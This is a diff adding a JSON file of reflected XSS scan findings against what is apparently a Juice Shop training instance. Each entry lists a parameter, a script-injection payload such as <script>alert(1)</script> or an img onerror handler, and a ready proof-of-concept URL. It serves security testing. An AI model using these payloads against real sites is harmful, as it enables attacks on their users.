@@ -1,0 +1,38 @@
+[
+  {
+    "Type": "V",
+    "Param": "q",
+    "Payload": "<script>alert(1)</script>",
+    "PoC": "http://juice-shop.justinc.srv:3000/#/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "CWE": "CWE-79",
+    "Severity": "High",
+    "InjectType": "inHTML-URL",
+    "Method": "GET",
+    "Evidence": "<script>alert(1)</script>",
+    "MessageStr": "Reflected XSS found in parameter q"
+  },
+  {
+    "Type": "R",
+    "Param": "comment",
+    "Payload": "\"><img src=x onerror=alert(1)>",
+    "PoC": "http://juice-shop.justinc.srv:3000/#/contact?comment=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "CWE": "CWE-79",
+    "Severity": "Medium",
+    "InjectType": "inHTML-Attr",
+    "Method": "POST",
+    "Evidence": "\"><img src=x onerror=alert(1)>",
+    "MessageStr": "Potential reflected XSS found in parameter comment"
+  },
+  {
+    "Type": "G",
+    "Param": "search",
+    "Payload": "'\"><script>",
+    "PoC": "http://juice-shop.justinc.srv:3000/api/products/search?q=%27%22%3E%3Cscript%3E",
+    "CWE": "CWE-79",
+    "Severity": "Low",
+    "InjectType": "inJS-Str",
+    "Method": "GET",
+    "Evidence": "'\">\u003cscript\u003e",
+    "MessageStr": "Grep-based XSS pattern found in parameter search"
+  }
+]
